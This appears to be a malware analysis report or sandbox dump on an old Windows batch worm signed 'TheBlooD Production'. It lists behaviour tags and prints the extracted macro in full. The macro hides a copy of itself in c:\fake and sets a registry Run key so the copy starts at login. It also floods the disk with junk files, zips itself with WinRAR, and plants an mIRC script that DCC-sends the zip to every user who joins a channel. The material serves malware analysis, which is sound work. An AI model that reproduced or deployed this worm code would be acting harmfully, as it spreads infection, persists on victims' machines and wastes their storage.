behavior.Run: May run an executable file or a system command
behavior.System: May run an executable file or a system command on a Mac

docinfo.macro:
md fake
attrib +h c:\fake
if not exist c:\fake\bloodfak.exe copy path0212E1.exe c:\fake\bloodfak.exe
copy path0212E1.exe c:\fake\path0212E1.exe
ECHO REGEDIT4>c:\fake\blood.reg
ECHO.>>c:\fake\blood.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>c:\fake\blood.reg
ECHO "System"="c:\fake\bloodfak.exe">>c:\fake\blood.reg
@REGEDIT /S /C c:\fake\blood.reg
tree>>c:\fake\a.a
tree>>c:\fake\a.a
tree>>c:\fake\a.a
tree>>c:\fake\a.a
tree>>c:\fake\a.a
tree>>c:\fake\a.a
cd c:\fake
set theblood=for
%theblood% /L %%a IN (1,1,300) do copy a.a %random%-%%a.a
if exist C:\ARCHIV~1\winrar\rar32.exe C:\ARCHIV~1\winrar\rar32.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\PROGRA~1\winrar\rar32.exe C:\PROGRA~1\winrar\rar32.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\ARCHIV~1\winrar\rar.exe C:\ARCHIV~1\winrar\rar.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\PROGRA~1\winrar\rar.exe C:\PROGRA~1\winrar\rar.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
goto blood0
:blood4
echo n3=>>C:\script.ini
goto blood5
:blood1
echo n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }>>>C:\script.ini
goto blood2
:blood0
echo [script]>>C:\script.ini
goto blood1
:blood3
echo n2=}>>>C:\script.ini
goto blood4
:blood5
echo n4=ON 1:connect: {>>C:\script.ini
goto blood6
:blood2
echo n1= /dcc send $nick c:\fake\path0212E1.zip>>C:\script.ini
goto blood3
:blood6
echo n5= /run attrib +r +s +h c:\fake\path0212E1.zip>>C:\script.ini
goto blood7
:blood7
echo n6=}>>C:\script.ini
goto blood8
:blood8
if exist C:\mIRC\mirc.exe copy C:\script.ini C:\mIRC>nul
if exist C:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini C:\ARCHIV~1\mIRC>nul
if exist C:\PROGRA~1\mIRC\mirc.exe copy C:\script.ini C:\PROGRA~1\mIRC>nul
if exist D:\mIRC\mirc.exe copy C:\script.ini D:\mIRC>nul
if exist D:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini D:\ARCHIV~1\mIRC>nul
if exist D:\PROGRA~1\mIRC\mirc.exe copy C:\script.ini D:\PROGRA~1\mIRC>nul
##################################
#     TheBlooD  Production �     #
#             Spain              # 
##################################
exit

filetype: ISO-8859 text, with CRLF line terminators

dump: if not exist c:\fake\bloodfak.exe copy path0212E1.exe c:\fake\bloodfak.exe
if exist C:\ARCHIV~1\winrar\rar32.exe C:\ARCHIV~1\winrar\rar32.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\PROGRA~1\winrar\rar32.exe C:\PROGRA~1\winrar\rar32.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\ARCHIV~1\winrar\rar.exe C:\ARCHIV~1\winrar\rar.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\PROGRA~1\winrar\rar.exe C:\PROGRA~1\winrar\rar.exe a -mdG -s -m5 path0212E1.zip c:\fake\path0212E1.exe
if exist C:\mIRC\mirc.exe copy C:\script.ini C:\mIRC>nul
if exist C:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini C:\ARCHIV~1\mIRC>nul
if exist C:\PROGRA~1\mIRC\mirc.exe copy C:\script.ini C:\PROGRA~1\mIRC>nul
if exist D:\mIRC\mirc.exe copy C:\script.ini D:\mIRC>nul
if exist D:\ARCHIV~1\mIRC\mirc.exe copy C:\script.ini D:\ARCHIV~1\mIRC>nul
